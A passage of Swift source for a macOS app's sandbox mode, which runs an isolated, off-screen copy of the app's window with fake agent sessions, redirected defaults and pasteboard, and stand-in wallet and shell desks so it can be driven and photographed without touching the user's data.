import AppKit
import Combine
import CryptoKit
import ObjectiveC
import SwiftUI
import VibeCore
import WebKit

/// `VibeSwitcher --sandbox STATE --shots DIR [--minutes N] [--fake-claude PATH]` (run by scripts/sandbox-app.sh): a
/// copy of the app's window that a worker builds from its worktree, drives and photographs, with nothing of the user's
/// in reach. The real window, chat, composer, settings and sheets, on a private session host running fake sessions
/// (the tests' FakeClaude on a scratch pty, never a real agent), all its state in STATE:
/// - a home of its own (HOME, CFFIXED_USER_HOME and VIBESWITCHER_HOME inside STATE, checked here), its own host on its
///   own lock (so the host keeps its vault in memory and never asks the Keychain for its key) and socket, and a
///   throwaway app key in memory: no Keychain item is read, the app's or the vault's (the app's Keychain stores are made
///   by AppDelegate alone, which this never makes);
/// - its own defaults, a suite in STATE (`redirectDefaults`): cfprefsd keeps an unbundled build's defaults in the real
///   ~/Library/Preferences whatever the home says, which is why it runs from a build folder only, never a bundle;
/// - no menu bar icon, hot key, notifications, Phone Access, remote server, Terminal reads or login item: none is made;
/// - never active, never on screen: its NSApplication (`SandboxApplication`) refuses activation, any policy but
///   `.prohibited` and modal runs, and keeps every window off screen, transparent, out of Mission Control and Spaces;
///   nothing is posted to the window server, the drive goes through the views themselves.
/// It's driven through files in STATE/control (`Driver.commands`; one request `req-ID` of NUL-separated words, its
/// reply `rep-ID`), and quits by itself after MINUTES (10) or on `quit`. `shot NAME` draws each of its windows in light
/// and dark into DIR as PNGs, from the views (no Screen Recording permission, as `--snapshot` and `--capture-window`).
enum Sandbox {
    /// Set at launch by `run`, the one place: only the `--sandbox` argument turns it on, never the environment or a
    /// default, so nothing can turn it on in the user's running app. What it guards does nothing in the sandbox.
    private(set) static var isOn = false

    /// Where the sandbox's windows sit: far off every screen.
    static let offscreen = NSPoint(x: -20_000, y: -20_000)
    /// The command the drive is on (for what the window guard notes).
    static var doing = "launch"

    static func run(arguments: [String]) -> Never {
        func value(_ flag: String) -> String? {
            arguments.firstIndex(of: flag).flatMap { arguments.indices.contains($0 + 1) ? arguments[$0 + 1] : nil }
        }
        guard let statePath = arguments.first.map({ ($0 as NSString).standardizingPath }), statePath.hasPrefix("/"),
              let shotsPath = value("--shots").map({ ($0 as NSString).standardizingPath }), shotsPath.hasPrefix("/") else {
            refuse("usage: VibeSwitcher --sandbox STATE --shots DIR [--minutes N] [--fake-claude PATH] [--empty] "
                   + "[--wallet-passage PATH --wallet-inbox DIR] (absolute paths); "
                   + "run it with scripts/sandbox-app.sh")
        }
        if let problem = refusal(state: statePath, bundleID: Bundle.main.bundleIdentifier, root: VibePaths.root.path,
                                 home: VibePaths.home, appHome: NSHomeDirectory(), accountHome: VibePaths.accountHome) {
            refuse(problem)
        }
        isOn = true
        // Before anything reads a default (AppKit included).
        redirectDefaults(to: (statePath as NSString).appendingPathComponent("defaults"))
        redirectPasteboard()
        keepWindowsWherePut()
        // Before anything makes the shared application: this is the one.
        let app = SandboxApplication.shared
        _ = app.setActivationPolicy(.prohibited)
        VibePaths.ensurePrivateDirectories()
        let minutes = value("--minutes").flatMap(Double.init).flatMap { $0 > 0 ? $0 : nil } ?? 10
        // An outside passage for wallet requests (scripts/e2e/wallet-e2e.sh's loop stand-in), with the inbox it lists:
        // both or neither, absolute. Without them the sandbox's own fake passage plays the Wallet Manager's Mac.
        let walletPassage = value("--wallet-passage"), walletInbox = value("--wallet-inbox")
        if walletPassage != nil || walletInbox != nil {
            guard let walletPassage, let walletInbox, walletPassage.hasPrefix("/"), walletInbox.hasPrefix("/") else {
                refuse("--wallet-passage PATH and --wallet-inbox DIR go together, as absolute paths")
            }
            // Never the real Passage: not its app's binary (nor a link to it), nor its inbox.
            let real = URL(fileURLWithPath: walletPassage).resolvingSymlinksInPath().path
            guard (walletPassage as NSString).lastPathComponent == "passage",
                  ![walletPassage, real].contains(where: { $0.range(of: ".app/", options: .caseInsensitive) != nil }) else {
                refuse("--wallet-passage \(walletPassage): a stand-in script named passage (scripts/e2e/loop-passage's side), never Passage itself")
            }
            guard !walletInbox.contains("app.passage.Passage") else { refuse("--wallet-inbox \(walletInbox): never Passage's own inbox") }
        }
        let driver = Driver(state: URL(fileURLWithPath: statePath, isDirectory: true),
                            shots: URL(fileURLWithPath: shotsPath, isDirectory: true),
                            fakeClaude: value("--fake-claude"), minutes: minutes, empty: arguments.contains("--empty"),
                            walletPassage: walletPassage.flatMap { path in walletInbox.map { (path, URL(fileURLWithPath: $0, isDirectory: true)) } })
        app.delegate = driver
        withExtendedLifetime(driver) { app.run() }
        exit(0)
    }

    private static func refuse(_ text: String) -> Never {
        FileHandle.standardError.write(Data("sandbox: \(text)\n".utf8))
        exit(64)
    }

    /// Why the sandbox won't start with this state folder and these paths, or nil when it may: it runs unbundled (a
    /// build folder's binary: a bundle's defaults are the app's), on a home and a VibeSwitcher folder inside `state`,
    /// none of them the account's own.
    static func refusal(state: String, bundleID: String?, root: String, home: String, appHome: String, accountHome: String) -> String? {
        // One spelling for each place: Foundation writes /private/tmp as /tmp, the shell the other way.
        func spelled(_ path: String) -> String {
            let standard = (path as NSString).standardizingPath
            return standard.hasPrefix("/private/") ? String(standard.dropFirst("/private".count)) : standard
        }
        let state = spelled(state)
        func inside(_ path: String) -> Bool { spelled(path).hasPrefix(state + "/") }
        let own = spelled(accountHome)
        if let bundleID { return "runs from a build folder only (.build/debug/VibeSwitcher), not a bundle (\(bundleID)): a bundle's defaults are the installed app's" }
        if state == own || own.hasPrefix(state + "/") || state.hasPrefix(own + "/.vibeswitcher") {
            return "the state folder \(state) holds your home or is in your ~/.vibeswitcher"
        }
        guard FileManager.default.fileExists(atPath: state) else { return "no state folder at \(state)" }
        guard inside(root) else { return "VibeSwitcher's folder \(root) isn't inside the state folder: set VIBESWITCHER_HOME into it" }
        guard inside(home), inside(appHome) else {
            return "the home (\(home), \(appHome)) isn't inside the state folder: set HOME and CFFIXED_USER_HOME into it"
        }
        return nil
    }

    // MARK: Defaults

    /// The defaults standard hands out, in place of the app's domain: a suite named by a path inside the state folder,
    /// which cfprefsd keeps in that path's .plist (a domain name would go to the real ~/Library/Preferences, see
    /// `Scratch.defaults` in the tests). Every `UserDefaults.standard` read and write goes there, and AppKit's own
    /// (window frames, split views).
    private static func redirectDefaults(to path: String) {
        SandboxDefaults.suite = UserDefaults(suiteName: path)
        guard SandboxDefaults.suite != nil,
              let standard = class_getClassMethod(UserDefaults.self, #selector(getter: UserDefaults.standard)),
              let own = class_getClassMethod(SandboxDefaults.self, #selector(SandboxDefaults.sandboxStandard)) else {
            refuse("couldn't give the sandbox defaults of its own")
        }
        method_setImplementation(standard, method_getImplementation(own))
        guard UserDefaults.standard === SandboxDefaults.suite else { refuse("couldn't give the sandbox defaults of its own") }
    }

    /// `NSPasteboard.general`, in place of the user's clipboard: a pasteboard of the sandbox's own, so a Copy or a Paste
    /// in it (the `drag`, `copy` and `paste` commands, SwiftTerm's own Copy and Paste) never reads or sets yours.
    private static func redirectPasteboard() {
        SandboxPasteboard.own = NSPasteboard.withUniqueName()
        guard let general = class_getClassMethod(NSPasteboard.self, #selector(getter: NSPasteboard.general)),
              let own = class_getClassMethod(SandboxPasteboard.self, #selector(SandboxPasteboard.sandboxGeneral)) else {
            refuse("couldn't give the sandbox a pasteboard of its own")
        }
        method_setImplementation(general, method_getImplementation(own))
        guard NSPasteboard.general === SandboxPasteboard.own else { refuse("couldn't give the sandbox a pasteboard of its own") }
    }

    // MARK: Windows

    /// AppKit pulls a titled window that's off every screen back until a corner of it shows (to -1240, -684 on a
    /// 1728-wide screen): in the sandbox a window stays where it's put, off screen (`hide`); so does the team-churn
    /// bench's with `--occluded`.
    static func keepWindowsWherePut() {
        guard let constrain = class_getInstanceMethod(NSWindow.self, #selector(NSWindow.constrainFrameRect(_:to:))) else {
            refuse("couldn't keep the sandbox's windows off screen")
        }
        let asPut: @convention(block) (NSWindow, NSRect, NSScreen?) -> NSRect = { _, frame, _ in frame }
        method_setImplementation(constrain, imp_implementationWithBlock(asPut))
    }

    /// Keeps `window` where nobody sees it: off every screen, transparent, out of Mission Control, ⌘` and window
    /// restoration, taking no clicks. Its views still lay out and draw for `shot`.
    static func hide(_ window: NSWindow) {
        if window.sheetParent == nil, window.frame.origin != offscreen { window.setFrameOrigin(offscreen) }
        if window.alphaValue != 0 { window.alphaValue = 0 }
        window.ignoresMouseEvents = true
        window.hasShadow = false
        window.isRestorable = false
        if window.sheetParent == nil { window.collectionBehavior.formUnion([.transient, .ignoresCycle]) }
    }

    /// The hidden window `wallet-page` draws its web view in. Not released by `close()`: Swift holds it, and a window
    /// AppKit also released on close was released twice (the sandbox crashed in the autorelease pool's pop).
    static func pageWindow(_ view: NSView) -> NSWindow {
        let window = NSWindow(contentRect: view.frame, styleMask: [.titled], backing: .buffered, defer: false)
        window.isReleasedWhenClosed = false
        window.contentView = view
        hide(window)
        return window
    }

    /// Whether `frame` reaches any of the screens.
    static func onScreen(_ frame: NSRect, screens: [NSRect] = NSScreen.screens.map(\.frame)) -> Bool {
        screens.contains { $0.intersects(frame) }
    }

    /// Each of the windows drawn as it is, its frame included, into `file` (PNG). False when it couldn't be drawn.
    static func draw(_ window: NSWindow, to file: URL) -> Bool {
        guard let view = window.contentView?.superview ?? window.contentView,
              let bitmap = view.bitmapImageRepForCachingDisplay(in: view.bounds) else { return false }
        view.cacheDisplay(in: view.bounds, to: bitmap)
        guard let png = bitmap.representation(using: .png, properties: [:]) else { return false }
        return (try? png.write(to: file)) != nil
    }

    /// As `draw`, through the window's layer tree: `cacheDisplay` leaves SwiftUI lists and fills out on macOS 27 (a
    /// blank sidebar, a Team tab with no colors), and `layershot` is for pictures that need them.
    static func drawLayers(_ window: NSWindow, to file: URL) -> Bool {
        guard let view = window.contentView?.superview ?? window.contentView, let layer = view.layer ?? window.contentView?.layer,
              let space = CGColorSpace(name: CGColorSpace.sRGB) else { return false }
        let scale = window.backingScaleFactor
        guard let context = CGContext(data: nil, width: Int(layer.bounds.width * scale), height: Int(layer.bounds.height * scale),
                                      bitsPerComponent: 8, bytesPerRow: 0, space: space,
                                      bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue) else { return false }
        context.scaleBy(x: scale, y: scale)
        layer.render(in: context)
        guard let image = context.makeImage(),
              let png = NSBitmapImageRep(cgImage: image).representation(using: .png, properties: [:]) else { return false }
        return (try? png.write(to: file)) != nil
    }

    /// A file name's part from `text`: letters, digits, `.`, `_` and `-` only.
    static func fileName(_ text: String) -> String {
        let kept = text.map { $0.isLetter || $0.isNumber || "._-".contains($0) ? $0 : "-" }
        let name = String(kept).trimmingCharacters(in: CharacterSet(charactersIn: ".-"))
        return name.isEmpty ? "shot" : name
    }
}

/// Holds the sandbox's pasteboard for the replaced `NSPasteboard.general`.
private final class SandboxPasteboard: NSObject {
    nonisolated(unsafe) static var own: NSPasteboard?
    @objc class func sandboxGeneral() -> NSPasteboard { own! }
}

/// Holds the sandbox's defaults for the replaced `UserDefaults.standard`.
private final class SandboxDefaults: NSObject {
    nonisolated(unsafe) static var suite: UserDefaults?
    @objc class func sandboxStandard() -> UserDefaults { suite! }
}

/// The sandbox's NSApplication: never active, never anything but `.prohibited` (no Dock icon, no menu bar), no modal
/// window (an alert's runModal answers Cancel at once, unseen), and every window kept off screen (`Sandbox.hide`). What
/// it refused is listed in `refused` (the `status` command, and the isolation test, read it).
final class SandboxApplication: NSApplication {
    private(set) var refused: [String] = []
    /// Windows the guard found on a screen (each moved off at once): none is ever put there.
    private(set) var foundOnScreen: [String] = []

    private func refuse(_ what: String) {
        refused.append(what)
        Breadcrumbs.shared.note("sandbox: refused \(what)")
    }

    override func activate() { refuse("activating the app") }
    override func activate(ignoringOtherApps flag: Bool) { refuse("activating the app") }

    override func setActivationPolicy(_ activationPolicy: NSApplication.ActivationPolicy) -> Bool {
        guard activationPolicy == .prohibited else {
            refuse("activation policy \(activationPolicy.rawValue)")
            return false
        }
        return super.setActivationPolicy(activationPolicy)
    }

    override func runModal(for window: NSWindow) -> NSApplication.ModalResponse {
        refuse("a modal window (\(window.title.isEmpty ? String(describing: type(of: window)) : window.title))")
        return .cancel
    }

    /// After each event: every window off screen again, should anything have moved one.
    override func updateWindows() {
        super.updateWindows()
        guardWindows()
    }

    func guardWindows() {
        for window in windows where window.isVisible {
            if window.sheetParent == nil, Sandbox.onScreen(window.frame) {
                foundOnScreen.append("\(type(of: window)) “\(window.title)” at \(NSStringFromRect(window.frame)) during \(Sandbox.doing)")
                Breadcrumbs.shared.note("sandbox: a window was on screen, moved off: \(foundOnScreen.last!)")
            }
            Sandbox.hide(window)
        }
    }
}

/// The sandbox's window, host and fake sessions, and what drives them.
private final class Driver: NSObject, NSApplicationDelegate {
    let state: URL
    let shots: URL
    let fakeClaude: String?
    let minutes: Double
    /// Started with no session (`run --empty`): no session host either until something asks for one, as at a first launch.
    let empty: Bool
    /// `run --passage PATH --passage-inbox DIR`: wallet requests go through this passage (the e2e run's loop stand-in)
    /// and results are read from this inbox, instead of the sandbox's own fake passage.
    let externalPassage: (path: String, inbox: URL)?
    let store: SessionStore
    let host: HostClient
    let model = WindowModel()
    let preferences = Preferences()
    /// Boost mode with the power source, your presence and the usage made up (`boost STATE`): never the Mac's.
    var boostSignals = (onAC: true, away: false, usage: AccountUsage())
    /// The battery's made-up charge for boost (`boost battery-on`, `battery-low`).
    var boostCharge = 86
    lazy var boostWatch: BoostWatch = {
        let watch = BoostWatch(preferences: preferences)
        watch.onAC = { [weak self] in self?.boostSignals.onAC }
        watch.percent = { [weak self] in self?.boostCharge }
        watch.away = { [weak self] in self?.boostSignals.away ?? false }
        watch.usage = { [weak self] in self?.boostSignals.usage ?? AccountUsage() }
        watch.currentFolder = { [weak self] in self?.store.sessions.first(where: \.isCurrent)?.cwd }
        return watch
    }()
    lazy var leads: LeadController = {
        // A lead `startlead` starts runs a fake Claude, never a real one (its arguments after the fake's own are ignored).
        let controller = LeadController(host: host, store: store) { [weak self] folder in self?.leadCommand(folder) ?? "exec /bin/cat" }
        controller.teamActivity = TeamActivity()
        // A lead's questions to you would be alerts: none in the sandbox.
        controller.confirm = { [weak self] title, text, buttons in
            self?.refuse("a lead's question (\(title) \(text))")
            return buttons.count - 1
        }
        controller.answersTrust = false
        // Push requests from the sandbox's own vault book (its fake lead holds no grant in the host's): `push`.
        controller.pushes.vault = pushVault.vault(folder: state.appendingPathComponent("push/vault"), as: { .app })
        // The agents' config held, from the same book: `confighold`.
        controller.configHolds.vault = pushVault.vault(folder: state.appendingPathComponent("push/vault"), as: { .app })
        // The fake Claude needs nothing installed.
        controller.preflight = { _ in nil }
        return controller
    }()
    lazy var briefing = BriefingModel(
        snapshot: { [weak self] in BriefingModel.Snapshot(boards: self?.leads.boards ?? [:], sessions: self?.store.sessions ?? []) },
        language: { .preferred() }, keyStore: BriefingKey(saved: AppProof.MemorySecret()), generate: { _ in nil })
    /// Push to talk with no microphone and no OpenAI: a recorder that hands over a made-up recording, an HTTP client
    /// that answers a made-up transcript, a key in memory (`dictation key|nokey|press|release|note`).
    let dictationKey = AppProof.MemorySecret()
    lazy var dictation: DictationController = {
        let controller = DictationController(keyStore: dictationKey, recorder: SandboxRecorder(), microphone: SandboxMicrophone(),
                                             transcription: OpenAITranscription(client: SandboxTranscriber()), findKey: { nil })
        controller.openSettings = { [weak self] in self?.showSettings(.dictation, reveal: .dictationKey) }
        // A fake Claude's /voice (`tell '{"op": "voice", "mode": "hold"}'`): never the user's Claude settings.
        controller.claudeSettings = { _ in ClaudeVoiceSettings() }
        controller.checkKey()
        return controller
    }()
    /// The wallet requests fake agents file (`wallet-ask`), through a fake `passage` in the state folder: never the real
    /// one, its Keychain, pairings or inbox. The Wallet Manager's Mac is played by `wallet-answer`.
    lazy var walletPassage: URL = {
        let folder = state.appendingPathComponent("wallet-passage", isDirectory: true)
        try? FileManager.default.createDirectory(at: folder.appendingPathComponent("inbox"), withIntermediateDirectories: true)
        let script = folder.appendingPathComponent("passage")
        try? Driver.fakePassage(folder.path).write(to: script, atomically: true, encoding: .utf8)
        chmod(script.path, 0o755)
        let peers = Driver.walletPeers.map { #"{"peerID":"\#($0.peerID)","name":"\#($0.name)","reachable":null}"# }.joined(separator: "\n") + "\n"
        try? peers.write(to: folder.appendingPathComponent("peers.jsonl"), atomically: true, encoding: .utf8)
        return folder
    }()
    /// The sandbox's stand-in for the session host's vault, which stamps wallet requests (see `WalletStamp`).
    let walletVault = LeadVault.Book()
    lazy var walletDesk: WalletDesk = {
        let passage = externalPassage?.path ?? walletPassage.appendingPathComponent("passage").path
        let clock = walletClock
        let desk = WalletDesk(folder: state.appendingPathComponent("wallet/asked", isDirectory: true),
                             store: WalletRequestStore(folder: state.appendingPathComponent("wallet/requests", isDirectory: true)),
                             inbox: externalPassage?.inbox ?? walletPassage.appendingPathComponent("inbox", isDirectory: true),
                             local: walletLocal,
                             config: { [weak self] in WalletDesk.Config(passage: passage, peer: self?.walletPeer ?? "") },
                             now: { clock.now() })
        desk.findPassage = { nil }
        desk.openSettings = { [weak self] in self?.showSettings(.wallet) }
        // The sandbox's host runs its fake sessions: named as the window lists them.
        desk.sessionNames = { [weak self] in
            guard let self else { return [:] }
            let titles = Dictionary(model.allRows.compactMap { row in row.hostID.map { ($0, row.title) } }, uniquingKeysWith: { first, _ in first })
            return Dictionary(fakeList.map { ($0.id.uuidString.lowercased(), titles[$0.id] ?? $0.label) }, uniquingKeysWith: { first, _ in first })
        }
        // Only a request its vault stamped (`wallet-ask` files through it, as the host's for the selected fake session).
        let book = walletVault
        desk.verifyStamps = { [folder = state] stamps in try book.vault(folder: folder.appendingPathComponent("wallet/vault"), as: { .app }).verifyWallet(stamps) }
        desk.sealMessage = { [folder = state] message in try book.vault(folder: folder.appendingPathComponent("wallet/vault"), as: { .app }).seal(message) }
        desk.verifyMessages = { [folder = state] messages in try book.vault(folder: folder.appendingPathComponent("wallet/vault"), as: { .app }).verify(messages) }
        // Sign in browser wallet: never the user's browser. The page's address is kept for `wallet-page`, which renders
        // it in a web view of the sandbox's own (no wallet extension there).
        desk.openBrowser = { [weak self] url in self?.walletPageURL = url }
        // The answer goes to the fake session's agent the way it would to a real one: its steer inbox, typed in between turns.
        desk.deliver = { [weak self] session, text, then in
            guard let id = UUID(uuidString: session) else { return then(.ended) }
            guard let self else { return then(.notYet) }
            leads.tell(text, from: .system("from the Wallet Manager"), session: id, then: then)
        }
        if preferences.walletPeerID.isEmpty { preferences.walletPeerID = Driver.walletPeers[0].peerID }
        return desk
    }()
    /// The shells fake agents ask for (`shell-ask`), stamped by the sandbox's vault as the host would for the selected
    /// fake session. Run starts a shell session in the sandbox's own host (its own home), never the user's.
    lazy var shellDesk: ShellDesk = {
        let desk = ShellDesk(folder: state.appendingPathComponent("shell/asked", isDirectory: true))
        desk.sessionNames = { [weak self] in
            guard let self else { return [:] }
            let titles = Dictionary(model.allRows.compactMap { row in row.hostID.map { ($0, row.title) } }, uniquingKeysWith: { first, _ in first })
            return Dictionary(fakeList.map { ($0.id.uuidString.lowercased(), titles[$0.id] ?? $0.label) }, uniquingKeysWith: { first, _ in first })
        }
        let book = walletVault
        desk.verifyStamps = { [folder = state] stamps in try book.vault(folder: folder.appendingPathComponent("wallet/vault"), as: { .app }).verifyWallet(stamps) }
        desk.deliver = { [weak self] session, text, then in
            guard let id = UUID(uuidString: session) else { return then(.ended) }
            guard let self else { return then(.notYet) }
            leads.tell(text, from: .system("from New Shell"), session: id, then: then)
        }
        desk.atOnce = { [weak self] in self?.preferences.letAgentsOpenShells ?? false }
        desk.launch = { [weak self] request, then in
            guard let self else { return then(.failure(ShellAsk.Refusal("the sandbox is quitting"))) }
            guard !shellLaunchFails else { return then(.failure(ShellAsk.Refusal("the sandbox's session host refused it: shell-fail on"))) }
            host.spawn(ShellAsk.spawnRequest(request, cols: 100, rows: 32)) { [weak self] result in
                switch result {
                case .success(let session):
                    self?.model.select(hostID: session.id)
                    then(.success((session.id, session.label)))
                case .failure(let error): then(.failure(ShellAsk.Refusal(error.message)))
                }
            }
        }
        return desk
    }()
    /// `shell-fail on`: the sandbox's shell launches fail, as a refusing session host's would.
    var shellLaunchFails = false
    /// The Wallet Manager peer the wallet desk sends to: the first made-up one, or none after `wallet-peer none`, or
    /// the Wallet Manager on this Mac after `wallet-peer this-mac`.
    var walletPeer = Driver.walletPeers[0].peerID
    /// The folder pair to a Wallet Manager on this Mac, under a home of the sandbox's own in its state folder (never
    /// the real ~/Library/Application Support). `wallet-peer this-mac` plays the Wallet Manager there.
    var walletLocal: WalletLocalLink { WalletLocalLink(home: state.appendingPathComponent("wallet/home", isDirectory: true).path) }
    /// The fake Wallet Manager's next result number, per request.
    var walletSequence: [String: Int64] = [:]
    /// The wallet desk's clock: the real one, moved ahead by `wallet-later`.
    let walletClock = WalletClock()
    final class WalletClock: @unchecked Sendable {
        private let lock = NSLock()
        private var ahead: TimeInterval = 0
        func now() -> Date { lock.withLock { Date().addingTimeInterval(ahead) } }
        func advance(_ seconds: TimeInterval) { lock.withLock { ahead += seconds } }
    }
    /// The local page Sign in browser wallet opened last (`wallet-click browser`), for `wallet-page`.
    var walletPageURL: URL?
    /// `wallet-page`'s web view and the made-up request's server, while it draws.
    var walletPageView: (window: NSWindow, view: WKWebView, loaded: WalletPageLoad)?
    var walletPageServer: WalletSignServer?
    var window: MainWindowController?
    /// The main window's actions (`sheet new-session-menu` lists the empty sidebar's menu from them).
    var windowActions: WindowActions?
    var settings: SettingsWindowController?
    var sheet: NSWindow?
    var sheetName: String?
    /// The phone's web app, once `phone` serves it.
    var phone: PhoneAccess?
    /// The day's actions on a timer, while `soak` runs them.
    var soakRun: SoakRun?
    /// What the drive asked for that the sandbox doesn't do (Terminal, a real agent, an alert).
    var refused: [String] = []
    private var cancellables: Set<AnyCancellable> = []
    private var poller: DispatchSourceTimer?
    private var ready = false

    /// A fake session: FakeClaude on one of the host's ptys.
    struct Fake {
        var id: UUID
        var tty: String
        var label: String
        var pid: Int32
        var cwd: String
        var transcript: String?
        var control: String?
        /// nil: a plain shell, which no scan takes for an agent.
        var agent: Agent? = .claude
    }
    /// The key the app proves itself with: its own, or (`unproved`) one the host doesn't hold.
    final class SandboxKey: @unchecked Sendable {
        let own = AppProof.MemoryStore()
        var stranger: SymmetricKey?
        var current: SymmetricKey? { stranger ?? own.key() }
    }
    private let key: SandboxKey
    private let lock = NSLock()
    /// By tty (read on the scanner's queue).
    private var fakes: [String: Fake] = [:]
    private var fakeCount = 0

    var home: String { VibePaths.home }
    let watchdog = HangWatchdog(samples: false)
    var control: URL { state.appendingPathComponent("control", isDirectory: true) }

    init(state: URL, shots: URL, fakeClaude: String?, minutes: Double, empty: Bool, walletPassage: (String, URL)? = nil) {
        self.state = state
        self.shots = shots
        self.fakeClaude = fakeClaude
        self.minutes = minutes
        self.empty = empty
        self.externalPassage = walletPassage.map { (path: $0.0, inbox: $0.1) }
        // Its own host: its own lock (not the user's host.lock: a host on it is the user's, which reads its vault key
        // from the Keychain), its socket in this home, ending with this process however it ends.
        let key = SandboxKey()
        self.key = key
        host = HostClient(socketPath: VibePaths.hostSocket.path, appKey: { key.current })
        // The lead's vault calls prove the app with the same key, as the app's do with its Keychain one (`HostClient.appKey`).
        HostConnection.appKey = key.own.key()
        host.hostArguments = HostClient.endsWithThisProcess + ["--lock", VibePaths.root.appendingPathComponent("sandbox-host.lock").path]
        weak var weakSelf: Driver?
        // Only the fake sessions: never the Mac's processes, never Terminal's tabs.
        store = SessionStore(scanner: SessionScanner(processes: { weakSelf?.processes() ?? [:] },
                                                     cwd: { pid in weakSelf?.cwd(pid) },
                                                     arguments: { _ in [] }),
                             bridge: .init(tabs: { .tabs([:]) }, screens: { _ in [:] }))
        super.init()
        weakSelf = self
        store.terminalFront = { (false, nil) }
        store.minimizeOnPause = false
    }

    func applicationDidFinishLaunching(_ notification: Notification) {
        Breadcrumbs.shared.note("sandbox: started in \(state.path), quitting in \(minutes) min")
        try? FileManager.default.createDirectory(at: control, withIntermediateDirectories: true, attributes: [.posixPermissions: 0o700])
        try? FileManager.default.createDirectory(at: shots, withIntermediateDirectories: true)
        watchTheClock()
        host.$sessions.receiveLatest(on: RunLoop.main).sink { [weak self] in self?.store.updateHosted($0) }.store(in: &cancellables)
        store.$sessions.combineLatest(host.$sessions, host.$state, store.$tableRead).receiveLatest(on: RunLoop.main)
            .sink { [weak self] sessions, hosted, state, table in
                self?.model.update(sessions: sessions, hosted: hosted, table: table, hostAnswered: state != .connecting)
            }
            .store(in: &cancellables)
        // A fake agent leaves with its session, as a real one does.
        host.$sessions.receiveLatest(on: RunLoop.main).sink { [weak self] sessions in
            guard let self else { return }
            let live = Set(sessions.filter(\.isLive).map(\.tty))
            self.lock.withLock { self.fakes = self.fakes.filter { live.contains($0.key) } }
        }.store(in: &cancellables)
        store.hostScreens = { [weak self] in self?.host.screens ?? [:] }
        store.requestHostScreens = { [weak self] in self?.host.refreshScreens(ttys: $0) }
        _ = leads
        // Its own freezes, reported as the app's are (in its own ~/.vibeswitcher/debug), without `sample`.
        watchdog.describeState = { [weak self] in self?.window?.debugState() ?? "window never opened" }
        watchdog.start()
        store.start()
        let first: (@escaping (String?) -> Void) -> Void = empty ? { $0(nil) } : { self.startFake(label: "Fake Claude", $0) }
        first { [weak self] problem in
            guard let self else { return }
            if let problem { Breadcrumbs.shared.note("sandbox: the first fake session didn't start: \(problem)") }
            self.openWindow()
            self.waitForRow {
                self.ready = true
                try? VibePaths.writePrivate(Data("\(getpid())\n".utf8), to: self.control.appendingPathComponent("started"))
                print("sandbox: ready (pid \(getpid()))")
                fflush(stdout)
            }
        }
        listen()
    }

    func applicationWillTerminate(_ notification: Notification) {
        Breadcrumbs.shared.note("sandbox: quitting")
        // Its fake `passage listen`, ended by its pid.
        walletDesk.close()
        shellDesk.close()
        Breadcrumbs.shared.flush()
        RunnableCommand.Script.removeAll()
    }

    /// Quits after `minutes`, from a thread of its own: a main thread that's stuck still ends.
    private func watchTheClock() {
        let seconds = minutes * 60
        Thread.detachNewThread {
            Thread.sleep(forTimeInterval: seconds)
            DispatchQueue.main.async {
                Breadcrumbs.shared.note("sandbox: \(seconds / 60) min up, quitting")
                NSApp.terminate(nil)
            }
            Thread.sleep(forTimeInterval: 15)
            exit(0)
        }
    }

    private func refuse(_ what: String) {
        refused.append(what)
        Breadcrumbs.shared.note("sandbox: refused \(what)")
    }

    // MARK: Fake sessions

    private func processes() -> [Int32: ProcInfo] {
        let fakes = lock.withLock { self.fakes }
        let launched = Date().addingTimeInterval(-3600)
        var table = UIBench.processTable(agents: fakes.filter { $0.value.agent == .claude }.mapValues(\.pid), launched: launched)
        for (tty, fake) in fakes where fake.agent == .codex {
            table[fake.pid] = ProcInfo(pid: fake.pid, ppid: 60_000, tty: tty, comm: "codex", startTime: launched, agent: .codex)
        }
        return table
    }

    private func cwd(_ pid: Int32) -> String? {
        lock.withLock { fakes.values.first { $0.pid == pid }?.cwd }
    }

    /// A new fake session: FakeClaude (or, without its script, a shell's `cat`) on a scratch pty of the sandbox's host,
    /// with a short conversation already in its transcript and the hook state a Claude session leaves. `agent` .codex:
    /// the same fake, told apart as Codex; nil: a shell's `cat`, with no agent at all.
    func startFake(label: String, slug named: String? = nil, transcript firstLines: String = Driver.firstTurn, agent: Agent? = .claude,
                   title: String? = nil, zsh: Bool = false, _ done: @escaping (String?) -> Void) {
        let fakeClaude = agent == nil ? nil : self.fakeClaude
        fakeCount += 1
        let number = fakeCount
        let slug = named ?? "sandbox-project" + (number == 1 ? "" : "-\(number)")
        let folder = (home as NSString).appendingPathComponent("projects/\(slug)")
        let files = state.appendingPathComponent("fake-\(number)", isDirectory: true)
        let projects = (home as NSString).appendingPathComponent(".claude/projects/-sandbox-\(slug)")
        let transcript = (projects as NSString).appendingPathComponent("\(UUID().uuidString).jsonl")
        let controlFile = files.appendingPathComponent("control.jsonl").path
        let agentState = files.appendingPathComponent("state.json").path
        for path in [folder, files.path, projects] {
            try? FileManager.default.createDirectory(atPath: path, withIntermediateDirectories: true)
        }
        let command: String
        if let fakeClaude {
            FileManager.default.createFile(atPath: transcript, contents: Data(firstLines.utf8))
            FileManager.default.createFile(atPath: controlFile, contents: nil)
            // A terminal title as Claude Code sets one (OSC 0), when given: 2.1.311 titles its sessions "worker-<slug>".
            let titled = title.map { "printf '\\033]0;%s\\007' '\($0)'; " } ?? ""
            command = titled + "exec /usr/bin/python3 -I -u '\(fakeClaude)' '\(transcript)' '\(controlFile)' '\(agentState)'"
        } else if zsh {
            // As a Shell preset's session runs (`$SHELL -l -i`), on the sandbox's home: its own dotfiles, none of yours.
            command = "echo \"{\\\"pid\\\": $$}\" > '\(agentState)'; exec /bin/zsh -l -i"
        } else {
            command = "printf 'A scratch terminal of the VibeSwitcher sandbox.\\n'; echo \"{\\\"pid\\\": $$}\" > '\(agentState)'; exec /bin/cat"
        }
        host.spawn(SpawnRequest(cwd: folder, command: command, env: [:], cols: 100, rows: 32, keepShell: false,
                                label: label, agent: fakeClaude == nil ? nil : agent?.rawValue)) { [weak self] result in
            guard let self else { return }
            switch result {
            case .failure(let error): done(error.message)
            case .success(let session):
                self.adopt(session, label: label, folder: folder, transcript: fakeClaude == nil ? nil : transcript,
                           control: fakeClaude == nil ? nil : controlFile, agentState: agentState, agent: agent, done)
            }
        }
    }

    /// A fake agent's session, once its agent said its pid: listed as the agent it is, with the hook state a Claude
    /// session leaves (`transcript` nil: a plain shell's, with none).
    private func adopt(_ session: HostSession, label: String, folder: String, transcript: String?, control: String?, agentState: String,
                       agent: Agent?, _ done: @escaping (String?) -> Void) {
        waitForPid(agentState, tries: 300) { pid in
            guard let pid else { return done("the fake agent never said its pid") }
